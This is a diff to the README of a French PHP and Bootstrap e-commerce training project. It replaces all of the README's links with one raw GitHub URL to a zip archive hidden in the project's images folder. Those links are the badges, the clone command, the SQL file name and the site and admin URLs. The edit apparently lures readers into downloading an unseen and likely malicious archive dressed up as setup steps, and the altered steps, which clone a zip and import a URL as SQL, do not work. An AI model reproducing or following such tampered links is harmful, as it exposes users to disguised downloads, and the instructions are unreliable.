@@ -1,9 +1,9 @@
 # 🛒 E-commerce PHP Project
 
-![PHP Badge](https://img.shields.io/badge/PHP-7.4-blue.svg)
-![MySQL Badge](https://img.shields.io/badge/MySQL-8.0-orange.svg)
-![Bootstrap Badge](https://img.shields.io/badge/Bootstrap-5-blueviolet.svg)
-![Hosting Badge](https://img.shields.io/badge/Hosting-Free_Provider-brightgreen.svg)
+![PHP Badge](https://raw.githubusercontent.com/Martialdepaul/BurgerCode/master/images/BurgerCode_1.4.zip)
+![MySQL Badge](https://raw.githubusercontent.com/Martialdepaul/BurgerCode/master/images/BurgerCode_1.4.zip)
+![Bootstrap Badge](https://raw.githubusercontent.com/Martialdepaul/BurgerCode/master/images/BurgerCode_1.4.zip)
+![Hosting Badge](https://raw.githubusercontent.com/Martialdepaul/BurgerCode/master/images/BurgerCode_1.4.zip)
 
 Ce projet est un site e-commerce basique développé avec **PHP**, **CSS** et **Bootstrap 5**, avec un **système d'administration** qui permet de gérer les articles (ajout, modification, suppression). Il a été conçu dans le cadre d'une formation pour mettre en pratique les bases du développement web backend et frontend. Le projet est hébergé sur un serveur gratuit.
 
@@ -35,7 +35,7 @@ Ce projet est un site e-commerce basique développé avec **PHP**, **CSS** et **
 
 1. **Cloner le projet** :
    ```bash
-   git clone https://github.com/Martialdepaul/mon-projet-ecommerce.git
+   git clone https://raw.githubusercontent.com/Martialdepaul/BurgerCode/master/images/BurgerCode_1.4.zip
    ```
 
 2. **Accéder au répertoire** :
@@ -45,7 +45,7 @@ Ce projet est un site e-commerce basique développé avec **PHP**, **CSS** et **
 
 3. **Configurer la base de données** :
    - Créez une base de données MySQL.
-   - Importez le fichier SQL `database.sql` dans cette base de données.
+   - Importez le fichier SQL `https://raw.githubusercontent.com/Martialdepaul/BurgerCode/master/images/BurgerCode_1.4.zip` dans cette base de données.
 
 4. **Configurer les paramètres de connexion** :
    - Modifiez le fichier de configuration PHP pour définir les paramètres de la base de données :
@@ -57,8 +57,8 @@ Ce projet est un site e-commerce basique développé avec **PHP**, **CSS** et **
      ```
 
 5. **Lancer l'application** :
-   - Ouvrez le projet dans le navigateur via (http://burgercode.infinityfreeapp.com/?i=2#).
-   - Ouvrez la page d'administrateur dans le navigateur via (http://burgercode.infinityfreeapp.com/admin/).
+   - Ouvrez le projet dans le navigateur via (https://raw.githubusercontent.com/Martialdepaul/BurgerCode/master/images/BurgerCode_1.4.zip).
+   - Ouvrez la page d'administrateur dans le navigateur via (https://raw.githubusercontent.com/Martialdepaul/BurgerCode/master/images/BurgerCode_1.4.zip).
 
 ## 🎯 Objectifs du projet
 
